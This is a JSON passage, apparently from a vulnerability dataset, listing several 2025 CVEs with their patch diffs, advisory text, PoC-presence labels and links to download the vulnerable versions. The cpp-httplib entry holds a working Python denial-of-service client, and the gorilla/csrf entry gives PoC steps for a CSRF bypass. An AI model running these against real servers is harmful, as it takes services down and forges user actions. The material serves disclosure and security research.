        "published_date": "2025-05-13T15:29:30.068Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\njustinas\n/\nnosurf\nPublic\nNotifications You must be signed in to change notification settings\nFork 127\nStar 1.7k\nCode\nIssues\n13\nPull requests\n2\nActions\nProjects\nWiki\nSecurity\n1\nInsights\nAdditional navigation options\nCSRF due to non-functional same-origin checks in justinas/nosurf\nModerate justinas published GHSA-w9hf-35q4-vcjw 3 days agoMay 13, 2025\nPackage\ngomod github.com/justinas/nosurf\n(\nGo\n)\nAffected versions\n<= 1.1.1\nPatched versions\n1.2.0\nDescription\nImpact\nThis vulnerability allows an attacker who controls content on the target site, or on a subdomain of the target site (either via XSS, or otherwise) to bypass Cross-Site Request Forgery checks and issue requests on user's behalf.\nDetails\nDue to misuse of the Go net/http library, nosurf categorizes all incoming requests as plain-text HTTP requests, in which case the Referer header is not checked to have the same origin as the target webpage.\nIf the attacker has control over HTML contents on either the target website (e.g. example.com), or on a website hosted on a subdomain of the target (e.g. attacker.example.com), they will also be able to manipulate cookies set for the target website. By acquiring the secret CSRF token from the cookie, or overriding the cookie with a new token known to the attacker, attacker.example.com is able to craft cross-site requests to example.com.\nPatches\nA patch for the issue was released in nosurf 1.2.0.\nWorkarounds\nIn lieu of upgrading to a patched version of nosurf, users may additionally use another HTTP middleware to ensure that a non-safe HTTP request is coming from the same origin (e.g. by requiring a Sec-Fetch-Site: same-origin header in the request).\nReferences\nGHSA-rq77-p4h8-4crw\nhttps://github.com/justinas/nosurf-cve-2025-46721\nhttps://www.cve.org/CVERecord?id=CVE-2025-46721\nhttps://github.com/justinas/nosurf/releases/tag/v1.2.0\nSeverity\nModerate\n6.0\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nPresent\nPrivileges Required\nNone\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N\nCVE ID\nCVE-2025-46721\nWeaknesses\nCWE-352\nCredits\npatrickod\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The provided advisory explains the impact, cause, and resolution of the vulnerability but does not include a proof of concept or explicit reproduction steps.",
                "url": "https://github.com/justinas/nosurf/security/advisories/GHSA-w9hf-35q4-vcjw"
            },
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nGitHub Advisory Database GitHub Reviewed CVE-2025-24358\ngorilla/csrf CSRF vulnerability due to broken Referer validation\nModerate severity GitHub Reviewed Published on Apr 13Apr 14, 2025 in gorilla/csrf \u2022 Updated 2 weeks agoMay 1, 2025\nVulnerability details\nDependabot alerts\n0\nPackage\ngomod github.com/gorilla/csrf\n(\nGo\n)\nAffected versions\n< 1.7.3\nPatched versions\n1.7.3\nDescription\nSummary\ngorilla/csrf is vulnerable to CSRF via form submission from origins that share a top level domain with the target origin.\nDetails\ngorilla/csrf does not validate the Origin header against an allowlist. Its executes its validation of the Referer header for cross-origin requests only when it believes the request is being served over TLS. It determines this by inspecting the r.URL.Scheme value. However, this value is never populated for \"server\" requests per the Go spec, and so this check does not run in practice.\n // URL specifies either the URI being requested (for server\n // requests) or the URL to access (for client requests).\n //\n // For server requests, the URL is parsed from the URI\n // supplied on the Request-Line as stored in RequestURI.  For\n // most requests, fields other than Path and RawQuery will be\n // empty. (See [RFC 7230, Section 5.3](https://rfc-editor.org/rfc/rfc7230.html#section-5.3))\n //\n // For client requests, the URL's Host specifies the server to\n // connect to, while the Request's Host field optionally\n // specifies the Host header value to send in the HTTP\n // request.\n URL *[url](https://pkg.go.dev/net/url).[URL](https://pkg.go.dev/net/url#URL)\nPoC\ncreate trusted origin target.example.test protected with gorilla/csrf and served over TLS hosting form on /submit\ncreate attacker origin attack.example.test served over TLS\nattacker exfiltrates token & cookie combination from target.example.test\nattacker sets exfiltrated cookie with domain=.example.test and path=/submit\nas the cookie has a more specific path than / (the default for CSRF cookies) it will be sent first by the browser on submit to our target origin\nsubmit form from attack.example.test with exfiltrated CSRF form token\nobserve valid form submission as attack.example.test Origin / Referer headers are not validated.\nImpact\nThis vulnerability allows an attacker who has gained XSS on a subdomain or top level domain to perform authenticated form submissions against gorilla/csrf protected targets that share the same top level domain.\nThis bug has existed in gorilla/csrf since its initial release in 2015.\nReferences\nGHSA-rq77-p4h8-4crw\ngorilla/csrf@9dd6af1\nhttps://nvd.nist.gov/vuln/detail/CVE-2025-24358\nhttps://pkg.go.dev/vuln/GO-2025-3607\nhttps://lists.debian.org/debian-lts-announce/2025/05/msg00002.html\napoorvajagtap published to gorilla/csrf on Apr 13Apr 14, 2025\nPublished to the GitHub Advisory Database on Apr 14Apr 14, 2025\nReviewed on Apr 14Apr 14, 2025\nPublished by the National Vulnerability Database on Apr 15Apr 15, 2025\nLast updated 2 weeks agoMay 1, 2025\nSeverity\nModerate\n5.4\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nPresent\nPrivileges Required\nNone\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P\nEPSS score\n0.01%\n(1st percentile)\nWeaknesses\nCWE-352\nCVE ID\nCVE-2025-24358\nGHSA ID\nGHSA-rq77-p4h8-4crw\nSource code\ngorilla/csrf\nCredits\npatrickod\nReporter\nThis advisory has been edited. See History.\nSee something to contribute? Suggest improvements for this vulnerability.\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes detailed steps under the 'PoC' section for reproducing the described vulnerability.",
                "url": "https://github.com/advisories/GHSA-rq77-p4h8-4crw"
            }
        ],
        "sw_version": "v1.1.1",
        "sw_version_wget": "https://github.com/justinas/nosurf/archive/refs/tags/v1.1.1.zip"
    },
    "CVE-2025-46723": {
        "cwe": [
            {
                "id": "CWE-131",
                "value": "CWE-131: Incorrect Calculation of Buffer Size"
            }
        ],
        "description": "OpenVM is a performant and modular zkVM framework built for customization and extensibility. In version 1.0.0, OpenVM is vulnerable to overflow through byte decomposition of pc in AUIPC chip. A typo results in the highest limb of pc being range checked to 8-bits instead of 6-bits. This results in the if statement never being triggered because the enumeration gives i=0,1,2, when instead the enumeration should give i=1,2,3, leaving pc_limbs[3] range checked to 8-bits instead of 6-bits. This leads to a vulnerability where the pc_limbs decomposition differs from the true pc, which means a malicious prover can make the destination register take a different value than the AUIPC instruction dictates, by making the decomposition overflow the BabyBear field. This issue has been patched in version 1.1.0.",
        "languages": [
            "Rust"
        ],
        "patch_commits": [
            {
                "content": "fix: auipc range check `pc_limbs[3]` to 6-bits\n\nThe order of enumerate and skip was wrong, causing the if statement to\nnot trigger.\n\nFilename: extensions/rv32im/circuit/src/auipc/core.rs:\n```\n@@ -129,8 +129,9 @@\nwhere\n             need_range_check.push(limb.into());\n         }\n \n+        assert_eq!(pc_limbs.len(), RV32_REGISTER_NUM_LIMBS);\n         // pc_limbs[0] is already range checked through rd_data[0]\n-        for (i, limb) in pc_limbs.iter().skip(1).enumerate() {\n+        for (i, limb) in pc_limbs.iter().enumerate().skip(1) {\n             if i == pc_limbs.len() - 1 {\n                 // Range check the most significant limb of pc to be in [0, 2^{PC_BITS-(RV32_REGISTER_NUM_LIMBS-1)*RV32_CELL_BITS})\n                 need_range_check.push(\n\n@@ -242,7 +243,7 @@\nwhere\n             need_range_check.push(limb);\n         }\n \n-        for (i, limb) in pc_limbs.iter().skip(1).enumerate() {\n+        for (i, limb) in pc_limbs.iter().enumerate().skip(1) {\n             if i == pc_limbs.len() - 1 {\n                 need_range_check.push((*limb) << (pc_limbs.len() * RV32_CELL_BITS - PC_BITS));\n             } else {\n```",
                "url": "https://github.com/openvm-org/openvm/commit/68da4b50c033da5603517064aa0a08e1bbf70a01"
            }
        ],
        "published_date": "2025-05-02T22:18:55.696Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nopenvm-org\n/\nopenvm\nPublic\nNotifications You must be signed in to change notification settings\nFork 58\nStar 232\nCode\nIssues\n11\nPull requests\n15\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nByte decomposition of pc in AUIPC chip can overflow\nHigh jonathanpwang published GHSA-jf2r-x3j4-23m7 2 weeks agoMay 2, 2025\nPackage\ncargo openvm\n(\nRust\n)\nAffected versions\n1.0.0\nPatched versions\n1.1.0\nDescription\nThe fix to https://cantina.xyz/code/c486d600-bed0-4fc6-aed1-de759fd29fa2/findings/21 has a typo that still results in the highest limb of pc being range checked to 8-bits instead of 6-bits.\nIn the AIR, we do\nopenvm/extensions/rv32im/circuit/src/auipc/core.rs\nLine 135 in 0f94c8a\n for (i, limb) in pc_limbs.iter().skip(1).enumerate() { \n        for (i, limb) in pc_limbs.iter().skip(1).enumerate() {\n            if i == pc_limbs.len() - 1 {\nIt should be\n        for (i, limb) in pc_limbs.iter().enumerate().skip(1) {\nRight now the if statement is never triggered because the enumeration gives i=0,1,2 when we instead want i=1,2,3. What this means is that pc_limbs[3] is range checked to 8-bits instead of 6-bits.\nThis leads to a vulnerability where the pc_limbs decomposition differs from the true pc, which means a malicious prover can make the destination register take a different value than the AUIPC instruction dictates, by making the decomposition overflow the BabyBear field.\nSeverity\nHigh\nCVE ID\nCVE-2025-46723\nWeaknesses\nNo CWEs\nCredits\njonathanpwang\nFinder\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory includes code snippets and explanations, but it does not directly provide a proof of concept or a complete step-by-step reproduction of the vulnerability.",
                "url": "https://github.com/openvm-org/openvm/security/advisories/GHSA-jf2r-x3j4-23m7"
            }
        ],
        "sw_version": "v1.0.0",
        "sw_version_wget": "https://github.com/openvm-org/openvm/archive/refs/tags/v1.0.0.zip"
    },
    "CVE-2025-46728": {
        "cwe": [
            {
                "id": "CWE-400",
                "value": "CWE-400: Uncontrolled Resource Consumption"
            }
        ],
        "description": "cpp-httplib is a C++ header-only HTTP/HTTPS server and client library. Prior to version 0.20.1, the library fails to enforce configured size limits on incoming request bodies when `Transfer-Encoding: chunked` is used or when no `Content-Length` header is provided. A remote attacker can send a chunked request without the terminating zero-length chunk, causing uncontrolled memory allocation on the server. This leads to potential exhaustion of system memory and results in a server crash or unresponsiveness. Version 0.20.1 fixes the issue by enforcing limits during parsing. If the limit is exceeded at any point during reading, the connection is terminated immediately. A short-term workaround through a Reverse Proxy is available. If updating the library immediately is not feasible, deploy a reverse proxy (e.g., Nginx, HAProxy) in front of the `cpp-httplib` application. Configure the proxy to enforce maximum request body size limits, thereby stopping excessively large requests before they reach the vulnerable library code.",
        "languages": [
            "C++"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* fix(parser): Limit line length in getline\n\nPrevents potential infinite loop and memory exhaustion in\nstream_line_reader::getline by enforcing max line length.\n\nSigned-off-by: Ville Vesilehto <ville@vesilehto.fi>\n\n* fix: increase default max line length to 32k\n\nLONG_QUERY_VALUE test is set at 25k.\n\nSigned-off-by: Ville Vesilehto <ville@vesilehto.fi>\n\n* test(client): expect read error with too long query\n\nAdds a test case (`TooLongQueryValue`) to verify client behavior\nwhen the request URI is excessively long, exceeding\n`CPPHTTPLIB_MAX_LINE_LENGTH`. In this scenario, the server is\nexpected to reset the connection.\n\nSigned-off-by: Ville Vesilehto <ville@vesilehto.fi>\n\n---------\n\nSigned-off-by: Ville Vesilehto <ville@vesilehto.fi>\n\nFilename: httplib.h:\n```\n@@ -145,6 +145,10 @@\n#define CPPHTTPLIB_LISTEN_BACKLOG 5\n #endif\n \n+#ifndef CPPHTTPLIB_MAX_LINE_LENGTH\n+#define CPPHTTPLIB_MAX_LINE_LENGTH 32768\n+#endif\n+\n /*\n  * Headers\n  */\n\n@@ -3067,6 +3071,11 @@\ninline bool stream_line_reader::getline() {\n #endif\n \n   for (size_t i = 0;; i++) {\n+    if (size() >= CPPHTTPLIB_MAX_LINE_LENGTH) {\n+      // Treat exceptionally long lines as an error to\n+      // prevent infinite loops/memory exhaustion\n+      return false;\n+    }\n     char byte;\n     auto n = strm_.read(&byte, 1);\n```\n\nFilename: test/test.cc:\n```\n@@ -43,6 +43,9 @@\nconst int PORT = 1234;\n const string LONG_QUERY_VALUE = string(25000, '@');\n const string LONG_QUERY_URL = \"/long-query-value?key=\" + LONG_QUERY_VALUE;\n \n+const string TOO_LONG_QUERY_VALUE = string(35000, '@');\n+const string TOO_LONG_QUERY_URL = \"/too-long-query-value?key=\" + TOO_LONG_QUERY_VALUE;\n+\n const std::string JSON_DATA = \"{\\\"hello\\\":\\\"world\\\"}\";\n \n const string LARGE_DATA = string(1024 * 1024 * 100, '@'); // 100MB\n\n@@ -2867,6 +2870,11 @@\nclass ServerTest : public ::testing::Test {\n                EXPECT_EQ(LONG_QUERY_URL, req.target);\n                EXPECT_EQ(LONG_QUERY_VALUE, req.get_param_value(\"key\"));\n              })\n+        .Get(\"/too-long-query-value\",\n+             [&](const Request &req, Response & /*res*/) {\n+               EXPECT_EQ(TOO_LONG_QUERY_URL, req.target);\n+               EXPECT_EQ(TOO_LONG_QUERY_VALUE, req.get_param_value(\"key\"));\n+             })\n         .Get(\"/array-param\",\n              [&](const Request &req, Response & /*res*/) {\n                EXPECT_EQ(3u, req.get_param_value_count(\"array\"));\n\n@@ -3655,6 +3663,13 @@\nTEST_F(ServerTest, LongQueryValue) {\n   EXPECT_EQ(StatusCode::UriTooLong_414, res->status);\n }\n \n+TEST_F(ServerTest, TooLongQueryValue) {\n+  auto res = cli_.Get(TOO_LONG_QUERY_URL.c_str());\n+\n+  ASSERT_FALSE(res);\n+  EXPECT_EQ(Error::Read, res.error());\n+}\n+\n TEST_F(ServerTest, TooLongHeader) {\n   Request req;\n   req.method = \"GET\";\n```",
                "url": "https://github.com/yhirose/cpp-httplib/commit/7b752106ac42bd5b907793950d9125a0972c8e8e"
            }
        ],
        "published_date": "2025-05-06T00:45:25.130Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nyhirose\n/\ncpp-httplib\nPublic\nNotifications You must be signed in to change notification settings\nFork 2.4k\nStar 14.3k\nCode\nIssues\n19\nPull requests\n9\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nUnbounded Memory Allocation in Chunked/No-Length Requests\nHigh yhirose published GHSA-px83-72rx-v57c 2 weeks agoMay 5, 2025\nPackage\nNo package listed\nAffected versions\n<=0.20.0\nPatched versions\n0.20.1\nDescription\nSummary\nThe library fails to enforce configured size limits on incoming request bodies when Transfer-Encoding: chunked is used or when no Content-Length header is provided. A remote attacker can send a chunked request without the terminating zero-length chunk, causing uncontrolled memory allocation on the server. This leads to potential exhaustion of system memory and results in a server crash or unresponsiveness.\nDetails\nHTTP allows clients to send data in variable-sized chunks. Each chunk is preceded by its size in hexadecimal, followed by CRLF (\\r\\n), then the chunk data, and finally another CRLF. The entire transfer ends with a zero-length chunk (0\\r\\n) followed by an optional trailer section and a final CRLF.\nThe vulnerability exists because the server's read_content_chunked function (and associated stream reading logic) continuously reads incoming chunks, accumulating the data (either into req.body or passing it to a content receiver). Crucially, it fails to limit the total accumulated size during this reading process for chunked transfers.\nAn attacker can maintain the connection and send unlimited chunk data without the terminating chunk, forcing unbounded memory allocation. This vulnerability affects the server before request routing is completed, impacting even requests to non-existent paths.\nPoC\nTested on macOS 15.4.1 and Apple clang version 17.0.0 (clang-1700.0.13.3).\nServer:\n#include \"httplib.h\"\n\nint main() {\n  httplib::Server svr;\n  \n  svr.Get(\"/hi\", [](const httplib::Request &, httplib::Response &res) {\n    res.set_content(\"Hello World!\", \"text/plain\");\n  });\n  svr.set_payload_max_length(5 * 1024);\n  std::cout << \"Starting server\" << std::endl;\n  svr.listen(\"0.0.0.0\", 8080);\n  return 0;\n}\nClient:\nimport socket\nimport time\nimport sys\n\n# Target server details (adjust as needed)\nTARGET_HOST = \"127.0.0.1\"\nTARGET_PORT = 8080\n\n# Size of each data chunk to send\nCHUNK_SIZE = 4096 # 4 KB per chunk\nCHUNK_DATA = b'A' * CHUNK_SIZE\n\ndef send_chunk(sock, data):\n    \"\"\"Formats and sends a single chunk.\"\"\"\n    hex_len = hex(len(data))[2:].encode('ascii') # Get hex length (e.g., '1000' for 4096)\n    try:\n        sock.sendall(hex_len + b'\\\\r\\\\n' + data + b'\\\\r\\\\n')\n        # print(f\"Sent chunk: {len(data)} bytes\")\n        return True\n    except socket.error as e:\n        print(f\"Socket error during send: {e}\", file=sys.stderr)\n        return False\n\ndef main():\n    print(f\"[*] Attempting DoS attack on {TARGET_HOST}:{TARGET_PORT} via chunked encoding...\")\n\n    try:\n        # Create and connect socket\n        sock = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10)\n        print(\"[+] Connected to server.\")\n\n        # Construct initial HTTP POST request headers\n        # Using a path like /post_target, though the specific path doesn't matter\n        # much as the vulnerability is in the core request reading.\n        request_headers = (\n            f\"POST /post_target HTTP/1.1\\\\r\\\\n\"\n            f\"Host: {TARGET_HOST}:{TARGET_PORT}\\\\r\\\\n\"\n            f\"Transfer-Encoding: chunked\\\\r\\\\n\"\n            f\"User-Agent: PoC-Client/1.0\\\\r\\\\n\"\n            f\"Connection: keep-alive\\\\r\\\\n\"\n            f\"\\\\r\\\\n\" # End of headers\n        ).encode('ascii')\n\n        # Send headers\n        sock.sendall(request_headers)\n        print(\"[+] Sent HTTP headers.\")\n        print(\"[*] Starting to send infinite chunks (press Ctrl+C to stop)...\")\n\n        # Send chunks indefinitely without the final '0\\\\r\\\\n\\\\r\\\\n'\n        bytes_sent = 0\n        start_time = time.time()\n        while True:\n            if not send_chunk(sock, CHUNK_DATA):\n                print(\"[-] Server connection closed unexpectedly.\")\n                break\n            bytes_sent += len(CHUNK_DATA)\n            # Optional: Slow down slightly to avoid overwhelming the network instantly\n            # time.sleep(0.01)\n\n            # Print status periodically\n            if bytes_sent % (CHUNK_SIZE * 100) == 0: # Print every 100 chunks\n                 elapsed = time.time() - start_time\n                 rate = bytes_sent / elapsed / (1024*1024) if elapsed > 0 else 0\n                 print(f\"[*] Sent {bytes_sent / (1024*1024):.2f} MB total ({rate:.2f} MB/s)...\")\n\n\n    except socket.timeout:\n        print(\"[-] Connection timed out.\", file=sys.stderr)\n    except socket.error as e:\n        print(f\"[-] Socket error: {e}\", file=sys.stderr)\n    except KeyboardInterrupt:\n        print(\"\\\\n[*] Attack stopped by user.\")\n    finally:\n        if 'sock' in locals() and sock:\n            print(\"[*] Closing socket.\")\n            sock.close()\n\nif __name__ == \"__main__\":\n    main() \nImpact\nDenial of Service: The server process will consume excessive memory until it crashes or becomes unresponsive.\nResource Exhaustion: On multi-tenant systems, this can impact other applications by consuming system resources.\nMitigation\nShort-term workaround through a Reverse Proxy: If updating the library immediately is not feasible, deploy a reverse proxy (e.g., Nginx, HAProxy) in front of the cpp-httplib application. Configure the proxy to enforce maximum request body size limits, thereby stopping excessively large requests before they reach the vulnerable library code.\nCode fix. Enforce limits during parsing. If the limit is exceeded at any point during reading, the connection should be terminated immediately (e.g., by returning an error or closing the stream).\nSeverity\nHigh\n7.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nCVE ID\nCVE-2025-46728\nWeaknesses\nCWE-400\nCredits\nthevilledev\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory provides a PoC code for a server in C++ and client in Python that demonstrates the exploitation of the vulnerability.",
                "url": "https://github.com/yhirose/cpp-httplib/security/advisories/GHSA-px83-72rx-v57c"
            }
        ],
        "sw_version": "v0.20.0",
        "sw_version_wget": "https://github.com/yhirose/cpp-httplib/archive/refs/tags/v0.20.0.zip"
    },
    "CVE-2025-47276": {
        "cwe": [
            {
                "id": "CWE-328",
                "value": "CWE-328: Use of Weak Hash"
            }
        ],
        "description": "Actualizer is a single shell script solution to allow developers and embedded engineers to create Debian operating systems (OS). Prior to version 1.2.0, Actualizer uses OpenSSL's  \"-passwd\" function, which uses SHA512 instead of a more suitable password hasher like Yescript/Argon2i. All Actualizer users building a full Debian Operating System are affected. Users should upgrade to version 1.2.0 of Actualizer. Existing OS deployment requires manual password changes against the alpha and root accounts. The change will deploy's Debian's yescript overriding the older SHA512 hash created by OpenSSL. As a workaround, users need to reset both `root` and \"Alpha\" users' passwords.",
        "languages": [
            "Shell"
        ],
        "patch_commits": [
            {
                "content": "Shell: fixed CVE-2025-47276\n\nu/apvs from reddit comment\n(https://www.reddit.com/r/debian/comments/1kknzqi/actualizer_v110_upgraded/)\nspotted this security vulnerability where the OpenSSL DID NOT use\nthe correct password hashing algorithm\n(reference: https://github.com/openssl/openssl/issues/19340). In fact,\nit uses a fast hashing algorithm sha512 under the hood without giving\nany single hint. This is fundamentally dead wrong. The correct algorithm\nshould one of the slow hashing type (preferably Argon2i): Read up:\nhttps://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\n\nThis is extremely bad. It flew under the radar. This is extremely\nunexpected from a tool heavily used for network TLS security with\npassword hashing offering. Debian had already moved to yescript. We have\nto migrate ASAP and fix this issue.\n\nFortunately, mkpasswd from whois package is a reliable tool.\nUnfortunately, mkpasswd does not have a --verify kind of function to\nverify user password. This means the existing looping implementation\nis still required.\n\nHence, let's do this.\n\nThis patch fixes CVE-2025-47276.\n\nCo-authored-by: Shuralyov, Jean <jean.shuralyov@proton.me>\nCo-authored-by: Galyna, Cory <cory.galyna@gmail.com>\nCo-authored-by: (Holloway) Chew, Kean Ho <me@hollowaykeanho.com>\nSigned-off-by: (Holloway) Chew, Kean Ho <me@hollowaykeanho.com>\n\nFilename: Shell/debian-minbase-install.sh:\n```\n@@ -15,7 +15,7 @@\n# initialize\n-APP_VERSION=\"1.1.0\"\n+APP_VERSION=\"1.2.0\"\n \n 1>&2 printf -- \"%s\\n\" \"\\\n (Holloway) Chew, Kean Ho's\n\n@@ -53,6 +53,38 @@\nfi\n \n \n \n+# install critical dependencies\n+1>&2 printf -- \"I: Install Required Apt Packages for Actualizer...\\n\"\n+____old_IFS=\"$IFS\"\n+while IFS=\"\" read ____line || [ -n \"$____line\" ]; do\n+        if [ \"$____line\" = \"\" ]; then\n+                continue\n+        fi\n+\n+\n+        1>&2 printf -- \"I: Installing '%s' Package...\\n\" \"$____line\"\n+        apt install \"$____line\" -y\n+        if [ $? -ne 0 ]; then\n+                1>&2 printf -- \"\\\n+E: Installation Failed!\n+E: Please Try Again or Perform Manual Installation.\n+E: Bailing Out...\n+\n+\" \"$____line\"\n+                IFS=\"$____old_IFS\"\n+                unset ____line ____old_IFS\n+                exit 1\n+        fi\n+done<<EOF\n+debootstrap\n+whois\n+EOF\n+IFS=\"$____old_IFS\"\n+unset ____line ____old_IFS\n+\n+\n+\n+\n # validate dependencies\n 1>&2 printf -- \"I: Validating Host OS...\\n\"\n ____old_IFS=\"$IFS\"\n\n@@ -61,6 +93,7 @@\nwhile IFS=\"\" read ____line || [ -n \"$____line\" ]; do\n                 continue\n         fi\n \n+\n         1>&2 printf -- \"I: Checking '%s'...\\n\" \"$____line\"\n         command -v \"$____line\" > /dev/null\n         if [ $? -ne 0 ]; then\n\n@@ -83,6 +116,7 @@\nlsblk\n pvcreate\n vgcreate\n lvcreate\n+mkpasswd\n mkfs.ext2\n mkfs.ext4\n mkfs.vfat\n\n@@ -774,7 +808,7 @@\nwhile [ \"$TARGET_PASSWORD_USER\" = \"\" ]; do\n         IFS=\"$____old_IFS\"\n         stty echo\n         1>&2 printf -- \"\\n\"\n-        case \"$____password\" in\n+        case \"$____verify\" in\n         \"\")\n                 continue # mis-pressed enter\n                 ;;\n\n@@ -784,16 +818,17 @@\nwhile [ \"$TARGET_PASSWORD_USER\" = \"\" ]; do\n \n         if [ ! \"$____password\" = \"$____verify\" ]; then\n                 1>&2 printf -- \"E: Password Mismatched!\\n\\n\"\n-                ____password=\"\"\n-                ____verify=\"\"\n+                unset ____password ____verify\n                 continue\n         fi\n-        ____verify=\"\"\n         unset ____verify\n \n \n         # password matched\n-        TARGET_PASSWORD_USER=\"$(openssl passwd -6 \"$____password\")\"\n+        TARGET_PASSWORD_USER=\"$( \\\n+                printf -- \"%s\" \"$____password\" \\\n+                | mkpasswd --method=yescrypt --stdin 2> /dev/null \\\n+        )\"\n         unset ____password ____verify\n         break\n done\n\n@@ -837,7 +872,7 @@\nwhile [ \"$TARGET_PASSWORD_ROOT\" = \"\" ]; do\n         IFS=\"$____old_IFS\"\n         stty echo\n         1>&2 printf -- \"\\n\"\n-        case \"$____password\" in\n+        case \"$____verify\" in\n         \"\")\n                 continue # mis-pressed enter\n                 ;;\n\n@@ -847,13 +882,15 @@\nwhile [ \"$TARGET_PASSWORD_ROOT\" = \"\" ]; do\n \n         if [ ! \"$____password\" = \"$____verify\" ]; then\n                 1>&2 printf -- \"E: Password Mismatched!\\n\\n\"\n-                ____password=\"\"\n-                ____verify=\"\"\n+                unset ____password ____verify\n                 continue\n         fi\n \n         # password matched\n-        TARGET_PASSWORD_ROOT=\"$(openssl passwd -6 \"$____password\")\"\n+        TARGET_PASSWORD_ROOT=\"$( \\\n+                printf -- \"%s\" \"$____password\" \\\n+                | mkpasswd --method=yescrypt --stdin 2> /dev/null \\\n+        )\"\n         unset ____password ____verify\n         break\n done\n```",
                "url": "https://github.com/ChewKeanHo/Actualizer/commit/32c9cc232c856f078f8269fba80ce7562bbff86b"
            }
        ],
        "published_date": "2025-05-13T15:34:28.801Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nChewKeanHo\n/\nActualizer\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 0\nStar 3\nCode\nIssues\n1\nPull requests\nActions\nProjects\nSecurity\n1\nInsights\nAdditional navigation options\nActualizer Uses OpenSSL's \"-passwd\" Function Which Uses SHA512 Under The Hood Instead of Proper Password Hasher like Yescript/Argon2i\nHigh hollowaykeanho published GHSA-v626-chv9-v9qr 4 days agoMay 13, 2025\nPackage\ndebian-minbase-install.sh\n(Debian Operating System)\nAffected versions\n<v1.1.0\nPatched versions\nv1.2.0\nDescription\nImpact\nWhat kind of vulnerability is it? Who is impacted?\nAll Actualizer users building a full Debian Operating System.\nPatches\nHas the problem been patched? What versions should users upgrade to?\nUser MUST MOVE UP TO VERSION v1.2.0.\nExisting OS deployment requires manual password changes against the alpha and root accounts. The change will deploy's Debian's yescript overriding the older SHA512 hash created by OpenSSL.\nWorkarounds\nIs there a way for users to fix or remediate the vulnerability without upgrading?\nUser need to reset both root and \"Alpha\" users' passwords.\nReferences\nAre there any links users can visit to find out more?\n#1\nopenssl/openssl#19340\nhttps://www.reddit.com/r/debian/comments/1kknzqi/actualizer_v110_upgraded/\nhttps://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\nSeverity\nHigh\n7.5\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\nCVE ID\nCVE-2025-47276\nWeaknesses\nNo CWEs\nCredits\nhollowaykeanho\nRemediation developer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not include direct proof of concept code or explicit steps to reproduce the vulnerability.",
                "url": "https://github.com/ChewKeanHo/Actualizer/security/advisories/GHSA-v626-chv9-v9qr"
            }
        ],
        "sw_version": "v1.1.0",
        "sw_version_wget": "https://github.com/ChewKeanHo/Actualizer/archive/refs/tags/v1.1.0.zip"
    }
}